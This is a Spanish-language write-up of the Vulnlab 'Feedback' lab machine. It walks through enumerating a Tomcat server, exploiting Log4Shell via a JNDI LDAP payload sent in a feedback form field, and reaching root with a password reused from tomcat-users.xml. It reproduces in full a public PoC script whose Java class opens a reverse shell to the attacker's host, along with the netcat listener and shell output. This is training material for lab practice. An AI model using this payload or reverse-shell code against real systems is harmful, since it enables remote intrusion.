---
layout: single
title: Feedback - Vulnlab
excerpt: "En este post vamos a resolver la máquina Feedback de la plataforma de Vulnlab en la cual vamos a explotar una vulnerabilidad conocida llamada log4shell qué salió en el año 2021 que afecta a la biblioteca de registro Apache Log4j esta vulnerabilidad se va a explotar gracias a que se está utilizando un servicio web con Tomcat obtendremos RCE gracias a esta vulnerabilidad para la escalada de privilegios gracias a un archivo de configuración podremos ver la contraseña del usuario root y simplemente migraremos a ese usuario."
date: 2024-03-23
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/Feedback-vulnlab/icon.png
  teaser_home_page: true
categories:
  - Vulnlab
tags:  
  - Log4shell
  - Information Leakage
---

## PortScan

- Comenzamos escaneando los puertos abiertos por el protocolo **TCP** y sus tecnologías que están corriendo.

```bash
➜  nmap sudo nmap -sCV -p22,8080 10.10.121.97 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-23 10:33 CST
Nmap scan report for 10.10.121.97
Host is up (0.16s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d7:5e:41:c7:8d:0a:68:1f:7d:cd:01:32:5d:70:09:1e (RSA)
|   256 fb:95:c3:2d:d4:fb:c9:cd:25:e6:52:17:e7:dc:3c:ff (ECDSA)
|_  256 78:e0:8c:58:d3:01:42:82:5a:47:95:6c:72:49:36:35 (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.56
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.56
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeracion puerto 8080

- Vemos que en el puerto **8080** está corriendo un servicio web que es **Apache Tomcat 9.0.56**.

```ruby
➜  nmap whatweb http://10.10.121.97:8080
http://10.10.121.97:8080 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.121.97], Title[Apache Tomcat/9.0.56]
```

- De momento vemos que no hay ningún subdominio.

```bash
➜  nmap curl -I http://10.10.121.97:8080
HTTP/1.1 200
Content-Type: text/html;charset=UTF-8
Transfer-Encoding: chunked
Date: Sat, 23 Mar 2024 16:36:52 GMT
```

- Esta es la página web:

<p align="center">
<img src="https://i.imgur.com/jz7DNHD.png">
</p>

- Vamos a hacer **fuzzing** para descubrir nuevas rutas.

```bash
➜  nmap gobuster dir -u http://10.10.121.97:8080 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 80 --no-error
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.121.97:8080
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/feedback             (Status: 302) [Size: 0] [--> /feedback/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
```

- Vemos rutas interesantes que nos reportan un **302**. Vamos a examinar su contenido.

<p align="center">
<img src="https://i.imgur.com/BCKmysa.png">
</p>

<p align="center">
<img src="https://i.imgur.com/DJ5rxwp.png">
</p>

<p align="center">
<img src="https://i.imgur.com/w4gaiZ9.png">
</p>

## Log4Shell

- Bueno, esta ruta ya es interesante.

<p align="center">
<img src="https://i.imgur.com/6rmzBT2.png">
</p>

- Vemos que nos deja ingresar data, vamos a capturar la petición con **Burpsuite** para ver cómo va todo por detrás.

<p align="center">
<img src="https://i.imgur.com/hSChmGm.png">
</p>

- Y aquí vemos la petición y un campo muy interesante.

<p align="center">
<img src="https://i.imgur.com/gzI8BQn.png">
</p>

- Si examinamos el código fuente de la página web, vemos lo siguiente:

<p align="center">
<img src="https://i.imgur.com/8T0nY1v.png">
</p>

- Vamos a explotar una vulnerabilidad muy conocida que se llama **Log4Shell** <https://www.ibm.com/mx-es/topics/log4j> .

>Log4Shell se refiere a una vulnerabilidad crítica de seguridad que afecta a Log4j, una biblioteca de registro de eventos de Java ampliamente utilizada. La vulnerabilidad, oficialmente denominada CVE-2021-44228, permite a un atacante ejecutar código arbitrario en un sistema afectado simplemente enviando un mensaje de registro especialmente diseñado. Esto puede conducir a una variedad de ataques, incluidos la ejecución remota de código, el acceso no autorizado a sistemas y datos sensibles, y el secuestro de aplicaciones.

- Podemos usar el siguiente **poc** <https://github.com/kozmer/log4j-shell-poc> .

- Algo que tenemos que hacer es descargar el **JDK**, ya que todo esto funciona con **java** <https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html>.

```bash
➜  content git clone https://github.com/kozmer/log4j-shell-poc
Cloning into 'log4j-shell-poc'...
remote: Enumerating objects: 52, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (12/12), done.
remote: Total 52 (delta 0), reused 1 (delta 0), pack-reused 40
Receiving objects: 100% (52/52), 38.74 MiB | 1.37 MiB/s, done.
Resolving deltas: 100% (7/7), done.
```

- Y listo, ahora tenemos todo correcto para comenzar con la explotación de esta vulnerabilidad.

```bash
➜  log4j-shell-poc git:(main) mv /home/miguel/Downloads/jdk-8u202-linux-x64.tar.gz .
➜  log4j-shell-poc git:(main) tar -xf jdk-8u202-linux-x64.tar.gz
➜  log4j-shell-poc git:(main) ./jdk1.8.0_202/bin/java -version
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
java version "1.8.0_202"
Java(TM) SE Runtime Environment (build 1.8.0_202-b08)
Java HotSpot(TM) 64-Bit Server VM (build 25.202-b08, mixed mode)
```

- Ahora vamos a instalar los `requirements.txt` .

```bash
➜  log4j-shell-poc git:(main) ✗ pip install -r requirements.txt
Defaulting to user installation because normal site-packages is not writeable
Requirement already satisfied: colorama in /usr/lib/python3/dist-packages (from -r requirements.txt (line 1)) (0.4.6)
Collecting argparse (from -r requirements.txt (line 2))
  Downloading argparse-1.4.0-py2.py3-none-any.whl.metadata (2.8 kB)
Downloading argparse-1.4.0-py2.py3-none-any.whl (23 kB)
Installing collected packages: argparse
Successfully installed argparse-1.4.0
```

- Ahora nos vamos a poner en escucha con **netcat** para que nos llegue la **shell** .

```bash
➜  log4j-shell-poc git:(main) ✗ sudo nc -nvlp 443
[sudo] password for miguel:
listening on [any] 443 ...
```

- Este es el exploit que se utiliza:

```python
#!/usr/bin/env python3

import argparse
from colorama import Fore, init
import subprocess
import threading
from pathlib import Path
import os
from http.server import HTTPServer, SimpleHTTPRequestHandler

CUR_FOLDER = Path(__file__).parent.resolve()


def generate_payload(userip: str, lport: int) -> None:
    program = """
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {

    public Exploit() throws Exception {
        String host="%s";
        int port=%d;
        String cmd="/bin/sh";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s=new Socket(host,port);
        InputStream pi=p.getInputStream(),
            pe=p.getErrorStream(),
            si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {
            while(pi.available()>0)
                so.write(pi.read());
            while(pe.available()>0)
                so.write(pe.read());
            while(si.available()>0)
                po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            }
            catch (Exception e){
            }
        };
        p.destroy();
        s.close();
    }
}
""" % (userip, lport)

    # writing the exploit to Exploit.java file

    p = Path("Exploit.java")

    try:
        p.write_text(program)
        subprocess.run([os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/javac"), str(p)])
    except OSError as e:
        print(Fore.RED + f'[-] Something went wrong {e}')
        raise e
    else:
        print(Fore.GREEN + '[+] Exploit java class created success')


def payload(userip: str, webport: int, lport: int) -> None:
    generate_payload(userip, lport)

    print(Fore.GREEN + '[+] Setting up LDAP server\n')

    # create the LDAP server on new thread
    t1 = threading.Thread(target=ldap_server, args=(userip, webport))
    t1.start()

    # start the web server
    print(f"[+] Starting Webserver on port {webport} http://0.0.0.0:{webport}")
    httpd = HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
    httpd.serve_forever()


def check_java() -> bool:
    exit_code = subprocess.call([
        os.path.join(CUR_FOLDER, 'jdk1.8.0_20/bin/java'),
        '-version',
    ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    return exit_code == 0


def ldap_server(userip: str, lport: int) -> None:
    sendme = "${jndi:ldap://%s:1389/a}" % (userip)
    print(Fore.GREEN + f"[+] Send me: {sendme}\n")

    url = "http://{}:{}/#Exploit".format(userip, lport)
    subprocess.run([
        os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/java"),
        "-cp",
        os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
        "marshalsec.jndi.LDAPRefServer",
        url,
    ])


def main() -> None:
    init(autoreset=True)
    print(Fore.BLUE + """
[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc
""")

    parser = argparse.ArgumentParser(description='log4shell PoC')
    parser.add_argument('--userip',
                        metavar='userip',
                        type=str,
                        default='localhost',
                        help='Enter IP for LDAPRefServer & Shell')
    parser.add_argument('--webport',
                        metavar='webport',
                        type=int,
                        default='8000',
                        help='listener port for HTTP port')
    parser.add_argument('--lport',
                        metavar='lport',
                        type=int,
                        default='9001',
                        help='Netcat Port')

    args = parser.parse_args()

    try:
        if not check_java():
            print(Fore.RED + '[-] Java is not installed inside the repository')
            raise SystemExit(1)
        payload(args.userip, args.webport, args.lport)
    except KeyboardInterrupt:
        print(Fore.RED + "user interrupted the program.")
        raise SystemExit(0)


if __name__ == "__main__":
    main()
```

- Este es el exploit que automatiza la explotación de la vulnerabilidad **Log4Shell**. Genera un exploit en java y usa **LDAP** y **HTTP** para desencadenar la ejecución del exploit, el exploit de **java** establece una conexión con el servidor **LDAP** y ejecuta la **shell**. Vamos a seguir los pasos que nos indican.

- Si les pasa este error, simplemente cambian el nombre y listo.

```bash
➜  log4j-shell-poc git:(main) ✗ python3 poc.py --userip 10.8.1.127 --webport 8000 --lport 443

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

Traceback (most recent call last):
  File "/home/miguel/Vulnlab/Feedback/content/log4j-shell-poc/poc.py", line 144, in <module>
    main()
  File "/home/miguel/Vulnlab/Feedback/content/log4j-shell-poc/poc.py", line 134, in main
    if not check_java():
           ^^^^^^^^^^^^
  File "/home/miguel/Vulnlab/Feedback/content/log4j-shell-poc/poc.py", line 86, in check_java
    exit_code = subprocess.call([
                ^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/subprocess.py", line 389, in call
    with Popen(*popenargs, **kwargs) as p:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/lib/python3.11/subprocess.py", line 1953, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: '/home/miguel/Vulnlab/Feedback/content/log4j-shell-poc/jdk1.8.0_20/bin/java'
➜  log4j-shell-poc git:(main) ✗ ls
Dockerfile  README.md     poc.py            target
LICENSE     jdk1.8.0_202  requirements.txt  vulnerable-application
➜  log4j-shell-poc git:(main) ✗ mv jdk1.8.0_202 jdk1.8.0_20
```

- Ahora funciona.

```bash
➜  log4j-shell-poc git:(main) python3 poc.py --userip 10.8.1.127 --webport 8000 --lport 443

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://10.8.1.127:1389/a}

[+] Starting Webserver on port 8000 http://0.0.0.0:8000
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Listening on 0.0.0.0:1389
```

- Ahora nos dice que ejecutemos lo siguiente `Send me: ${jndi:ldap://10.8.1.127:1389/a}`, esta es una URL JNDI (Java Naming and Directory Interface) que apunta a un servidor LDAP.

- Antes de enviarlo, vamos a convertirlo en **URL-encoded** .

<p align="center">
<img src="https://i.imgur.com/tboV7kX.png">
</p>

- Ahora lo Copeamos y modificamos la petición que tenemos con **burpsuite**.

- Si enviamos la petición antes de poner la data, vemos que obtenemos esa respuesta, así que podemos basarnos en obtener algo similar para comprobar que funcione.

<p align="center">
<img src="https://i.imgur.com/86C57EP.png">
</p>

- Ahora en la parte de **name** pondremos todo:

<p align="center">
<img src="https://i.imgur.com/C6P8ZHF.png">
</p>

- Y enviamos la petición.

<p align="center">
<img src="https://i.imgur.com/1zE3nfi.png">
</p>

## Shell as tomcat

- Y ahora nos llega la shell.

```bash
➜  log4j-shell-poc git:(main) ✗ sudo nc -nvlp 443
[sudo] password for miguel:
listening on [any] 443 ...
connect to [10.8.1.127] from (UNKNOWN) [10.10.121.97] 47262
whoami
tomcat
```

- Vemos que sí se obtuvo una petición por parte del servidor.

```bash
➜  log4j-shell-poc git:(main) python3 poc.py --userip 10.8.1.127 --webport 8000 --lport 443

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://10.8.1.127:1389/a}

[+] Starting Webserver on port 8000 http://0.0.0.0:8000
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Listening on 0.0.0.0:1389
Send LDAP reference result for a redirecting to http://10.8.1.127:8000/Exploit.class
10.10.121.97 - - [23/Mar/2024 11:40:17] "GET /Exploit.class HTTP/1.1" 200 -
```

- Ahora obtenemos una **bash** interactiva.

```bash
python3 -c 'import pty;pty.spawn("bin/bash")'
tomcat@ip-10-10-10-7:/$
```

## Privilege Escalation

- Vemos el **pkexec**, pero no lo vamos a explotar.

```bash
tomcat@ip-10-10-10-7:/$ find / -perm -4000 2>/dev/null | grep -v '/snap/'
find / -perm -4000 2>/dev/null | grep -v '/snap/'
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/newuidmap
/bin/ping
/bin/su
/bin/fusermount
/bin/umount
/bin/mount
tomcat@ip-10-10-10-7:/$
```

- Vemos que hay un directorio **conf**.

```bash
tomcat@ip-10-10-10-7:~$ ls -la
ls -la
total 156
drwxr-xr-x 9 root   tomcat  4096 Dec 11  2021 .
drwxr-xr-x 4 root   root    4096 Dec 11  2021 ..
-rw-r----- 1 root   tomcat 18970 Dec  2  2021 BUILDING.txt
-rw-r----- 1 root   tomcat  6210 Dec  2  2021 CONTRIBUTING.md
-rw-r----- 1 root   tomcat 57092 Dec  2  2021 LICENSE
-rw-r----- 1 root   tomcat  2333 Dec  2  2021 NOTICE
-rw-r----- 1 root   tomcat  3378 Dec  2  2021 README.md
-rw-r----- 1 root   tomcat  6898 Dec  2  2021 RELEASE-NOTES
-rw-r----- 1 root   tomcat 16507 Dec  2  2021 RUNNING.txt
drwxr-x--- 2 root   tomcat  4096 Dec 11  2021 bin
drwxr-x--- 2 root   tomcat  4096 Dec 11  2021 conf
drwxr-x--- 2 root   tomcat  4096 Dec 11  2021 lib
drwxr-x--- 2 tomcat tomcat  4096 Mar 23 16:32 logs
drwxr-x--- 2 tomcat tomcat  4096 Mar 23 16:32 temp
drwxr-x--- 8 tomcat tomcat  4096 Dec 11  2021 webapps
drwxr-x--- 3 tomcat tomcat  4096 Dec 11  2021 work
tomcat@ip-10-10-10-7:~$
```

- Y bueno, vemos un archivo interesante que se llama **tomcat-users.xml** con credenciales.

```bash
tomcat@ip-10-10-10-7:~/conf$ ls -la
ls -la
total 240
drwxr-x--- 2 root tomcat   4096 Dec 11  2021 .
drwxr-xr-x 9 root tomcat   4096 Dec 11  2021 ..
-rw-r----- 1 root tomcat  12953 Dec  2  2021 catalina.policy
-rw-r----- 1 root tomcat   7276 Dec  2  2021 catalina.properties
-rw-r----- 1 root tomcat   1400 Dec  2  2021 context.xml
-rw-r----- 1 root tomcat   1149 Dec  2  2021 jaspic-providers.xml
-rw-r----- 1 root tomcat   2313 Dec  2  2021 jaspic-providers.xsd
-rw-r----- 1 root tomcat   4144 Dec  2  2021 logging.properties
-rw-r----- 1 root tomcat   7580 Dec  2  2021 server.xml
-rw-r----- 1 root tomcat   1226 Dec 11  2021 tomcat-users.xml
-rw-r----- 1 root tomcat   2558 Dec  2  2021 tomcat-users.xsd
-rw-r----- 1 root tomcat 172359 Dec  2  2021 web.xml
tomcat@ip-10-10-10-7:~/conf$
```

- Vemos las credenciales.

```bash
tomcat@ip-10-10-10-7:~/conf$ cat tomcat-users.xml
cat tomcat-users.xml
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
  <user username="admin" password="H2RR3rGDrbAnPxWa" roles="manager-gui"/>
  <user username="robot" password="H2RR3rGDrbAnPxWa" roles="manager-script"/>

</tomcat-users>
tomcat@ip-10-10-10-7:~/conf$
```

## Shell as root

- Si las probamos, vemos que prácticamente es la contraseña del usuario **root**.

```bash
tomcat@ip-10-10-10-7:~/conf$ su root
su root
Password: H2RR3rGDrbAnPxWa

root@ip-10-10-10-7:/opt/tomcat/conf# whoami
whoami
root
root@ip-10-10-10-7:/opt/tomcat/conf#
```

- Y allí podemos ver la flag.

```bash
root@ip-10-10-10-7:~# cat root.txt
cat root.txt
VL{xd}
```

## Extra info

-  <https://www.hackplayers.com/2021/12/ce-en-log4j-log4shell-simple-exploit.html>

<iframe width="560" height="315" src="https://www.youtube.com/embed/gfsxmz3ATBE" frameborder="0" allowfullscreen></iframe>
